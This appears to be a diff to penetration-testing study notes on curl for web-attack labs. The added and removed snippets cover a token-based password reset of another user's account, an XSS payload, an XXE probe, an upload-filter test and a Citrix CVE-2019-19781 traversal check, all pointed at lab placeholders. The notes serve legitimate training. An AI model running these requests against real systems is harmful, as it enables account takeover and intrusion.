+TOKEN=$(curl -sS --compressed -b "PHPSESSID=$SESSION_A; uid=$A_ID" \
+  "$BASE/api.php/token/$TARGET_ID" | jq -er '.token')
+curl -sS -G -b "PHPSESSID=$SESSION_A; uid=$A_ID" \
+  --data-urlencode "uid=$TARGET_ID" \
+  --data-urlencode "token=$TOKEN" \
+  --data-urlencode "password=$NEW_LAB_PASSWORD" "$BASE/reset.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks: Assessment Learning Notes — 3. Correct the token format, then compare the reset method](/web/web-attacks-assessment#3-correct-the-token-format-then-compare-the-reset-method)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Repeatable enumeration loop">
+
+### Repeatable enumeration loop
+
+**Web Attacks: Enumeration and Attack Chains**
+
+```bash
+# Kali: use the host, port and cookie from your current lab session.
+BASE='http://TARGET:PORT'
+SESSION='REPLACE_WITH_CURRENT_SESSION'
+mkdir -p evidence/web-attacks
+curl -sS --compressed -b "PHPSESSID=$SESSION" \
+  -D evidence/web-attacks/profile.headers \
+  -o evidence/web-attacks/profile.html "$BASE/profile.php"
+rg -n 'fetch\(|api\.php|token|uid|reset|\.js' evidence/web-attacks/profile.html
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks: Enumeration and Attack Chains — Repeatable enumeration loop](/web/web-attacks#repeatable-enumeration-loop)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Build a failure baseline before fuzzing">
+
+### Build a failure baseline before fuzzing
+
+**Web Enumeration**
+
+```bash
+curl -sS -o missing.html -w '%{http_code} %{size_download}\n' \
+  "$BASE/definitely-not-a-real-page-58291"
+curl -sS -H 'Host: definitely-not-real.app.htb' \
+  -o missing-host.html -w '%{http_code} %{size_download}\n' "http://$IP/"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Enumeration — Build a failure baseline before fuzzing](/web/web-enumeration#build-a-failure-baseline-before-fuzzing)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Choose the next technical note">
+
+### Choose the next technical note
+
+**Web Enumeration**
 
 ```bash
 # Fingerprint
@@ -1102,112 +2536,229 @@ ffuf -H "Host: FUZZ.$DOMAIN" -u http://$IP -w /usr/share/seclists/Discovery/DNS/
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Web Enumeration — Earlier notebook reference](/web/web-enumeration#earlier-notebook-reference)
+**Original note sections:** [Web Enumeration — Choose the next technical note](/web/web-enumeration#choose-the-next-technical-note)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 </Accordion>
 
-<Accordion title="7. TROUBLESHOOTING">
+<Accordion title="Establish the correct site">
 
-### 7. TROUBLESHOOTING
+### Establish the correct site
 
-**BloodHound: Full Reference**
+**Web Enumeration**
 
-Context from the notebook: compose file "not found" filename typo ( bh.compose.yml  vs  bh-compose.yml ) match the exact name  curl -o  saved
-
-```text
-curl -o
+```bash
+IP='10.129.10.10'
+BASE='http://app.htb'
+curl -sS -D headers.txt -o landing.html "$BASE/"
+whatweb "$BASE/"
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [BloodHound: Full Reference — 7. TROUBLESHOOTING](/cheatsheets/bloodhound-complete-guide#7-troubleshooting)
+**Original note sections:** [Web Enumeration — Establish the correct site](/web/web-enumeration#establish-the-correct-site)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Web Enumeration**
+
+```bash
+curl --resolve "app.htb:80:$IP" -sS -D - 'http://app.htb/'
+curl --resolve "app.htb:443:$IP" -sS -D - 'https://app.htb/'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Enumeration — Establish the correct site](/web/web-enumeration#establish-the-correct-site)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 </Accordion>
 
-<Accordion title="Quick reference">
+<Accordion title="Read what the application already exposes">
 
-### Quick reference
+### Read what the application already exposes
 
-**Citrix NetScaler: CVE-2019-19781 Reference**
+**Web Enumeration**
 
-Context from the notebook: Manual check curl -sk `https://<T>/vpn/../vpns/cfg/smb.conf`  → leaks  [global]
-
-```text
-curl -sk https://<T>/vpn/../vpns/cfg/smb.conf
+```bash
+curl -sS "$BASE/robots.txt"
+curl -sS "$BASE/sitemap.xml"
+rg -n 'href=|src=|action=|<!--' landing.html
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Quick reference](/enumeration/citrix-netscaler#quick-reference)
+**Original note sections:** [Web Enumeration — Read what the application already exposes](/web/web-enumeration#read-what-the-application-already-exposes)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Web Enumeration**
+
+```bash
+curl -sS "$BASE/js/app.js" -o app.js
+rg -n 'fetch\(|axios|/api/|url:|endpoint|token' app.js
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Enumeration — Read what the application already exposes](/web/web-enumeration#read-what-the-application-already-exposes)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 </Accordion>
 
-<Accordion title="The essential toolset">
+<Accordion title="1. Confirm which application you are visiting">
 
-### The essential toolset
+### 1. Confirm which application you are visiting
 
-**Getting Started with Penetration Testing**
+**Web: Enumeration Methodology**
 
-Context from the notebook: Web tech fingerprint whatweb ,  nikto ,  curl -I
-
-```text
-curl -I
+```bash
+mkdir -p evidence/web
+curl --version
+curl -sS -D evidence/web/root.headers -o evidence/web/root.body http://10.129.10.10/
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Getting Started with Penetration Testing — The essential toolset](/getting-started/getting-started-cheat-sheet#the-essential-toolset)
+**Original note sections:** [Web: Enumeration Methodology — 1. Confirm which application you are visiting](/web/methodology#1-confirm-which-application-you-are-visiting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Web: Enumeration Methodology**
+
+```bash
+curl -sS -D evidence/web/missing.headers -o evidence/web/missing.body \
+  --resolve 'app.lab.htb:80:10.129.10.10' http://app.lab.htb/this-path-should-not-exist-7c21
+wc -c evidence/web/root.body evidence/web/missing.body
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web: Enumeration Methodology — 1. Confirm which application you are visiting](/web/methodology#1-confirm-which-application-you-are-visiting)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 </Accordion>
 
-<Accordion title="Signature moves &amp; deep dive">
+<Accordion title="3. Change one upload property at a time">
 
-### Signature moves & deep dive
+### 3. Change one upload property at a time
 
-**Ports, Protocols, and Services by Purpose**
+**Web: Enumeration Methodology**
 
-Context from the notebook: Read mail over TLS:   openssl s_client -connect &lt;IP>:993  (IMAP) or  :995  (POP3); or  curl -k 'imaps://&lt;IP>' --user &lt;user>:&lt;pass>
-
-```text
-curl -k 'imaps://<IP>' --user <user>:<pass>
+```bash
+printf 'CPTS upload marker 7c21\n' > marker.txt
+curl -sS --resolve 'app.lab.htb:80:10.129.10.10' -b 'SESSION=REPLACE_ME' \
+  -F 'csrf=FRESH_TOKEN' -F 'file=@marker.txt;filename=marker.png;type=image/png' \
+  -D evidence/web/marker.headers -o evidence/web/marker.body http://app.lab.htb/upload
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Ports, Protocols, and Services by Purpose — Signature moves & deep dive](/reference/master-protocol-service-quick-reference#signature-moves-&-deep-dive)
+**Original note sections:** [Web: Enumeration Methodology — 3. Change one upload property at a time](/web/methodology#3-change-one-upload-property-at-a-time)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 </Accordion>
 
-<Accordion title="Web Protocols &amp; Recon">
+<Accordion title="DOM XSS: follow source to sink">
 
-### Web Protocols & Recon
+### DOM XSS: follow source to sink
 
-**Ports, Protocols, and Services by Purpose**
+**XSS (Cross-Site Scripting)**
 
-Context from the notebook: curl Grab headers, banner grab curl -I &lt;URL>
-
-```text
-curl -I <URL>
+```bash
+# Download an observed script path, rather than guessing that it exists.
+curl -sS "$BASE/js/app.js" -o app.js
+rg -n 'location\.(search|hash)|document\.URL|innerHTML|outerHTML|document\.write|insertAdjacentHTML|eval\(' app.js
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Ports, Protocols, and Services by Purpose — Web Protocols & Recon](/reference/master-protocol-service-quick-reference#web-protocols-&-recon)
+**Original note sections:** [XSS (Cross-Site Scripting) — DOM XSS: follow source to sink](/web/xss#dom-xss-follow-source-to-sink)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Locate the input and its consumers">
+
+### Locate the input and its consumers
+
+**XSS (Cross-Site Scripting)**
+
+```bash
+BASE='http://app.htb'
+curl -sS -G --data-urlencode 'q=xss-search-01' "$BASE/search.php" -o response.html
+rg -n -C 3 'xss-search-01' response.html
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [XSS (Cross-Site Scripting) — Locate the input and its consumers](/web/xss#locate-the-input-and-its-consumers)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Send the intended bytes">
+
+### Send the intended bytes
+
+**XSS (Cross-Site Scripting)**
+
+```bash
+curl -sS -G --data-urlencode 'q=<img src=x onerror=alert(window.origin)>' \
+  "$BASE/search.php" -o xss-response.html
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [XSS (Cross-Site Scripting) — Send the intended bytes](/web/xss#send-the-intended-bytes)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Send a saved XML body without shell damage">
+
+### Send a saved XML body without shell damage
+
+**XXE: XML External Entity Injection**
+
+```bash
+BASE='http://TARGET:PORT'
+SESSION='REPLACE_WITH_CURRENT_SESSION'
+mkdir -p evidence/xxe
+cat > evidence/xxe/probe.xml <<'XML'
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY marker "XXE-PROBE-742">]>
+<root><name>&marker;</name><details>Test</details><date>2026-11-09</date></root>
+XML
+curl -sS --compressed -b "PHPSESSID=$SESSION" \
+  -H 'Content-Type: text/plain;charset=UTF-8' \
+  --data-binary @evidence/xxe/probe.xml \
+  -D evidence/xxe/response.headers -o evidence/xxe/response.body "$BASE/addEvent.php"
+rg -n 'XXE-PROBE|entity|DOCTYPE|error' evidence/xxe/response.body
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [XXE: XML External Entity Injection — Send a saved XML body without shell damage](/web/xxe#send-a-saved-xml-body-without-shell-damage)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1216,6 +2767,11 @@ curl -I <URL>
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://curl.se/docs/manpage.html)
+- [Official documentation 2](https://github.com/jpillora/chisel)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -1223,5 +2779,3 @@ curl -I <URL>
 - [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
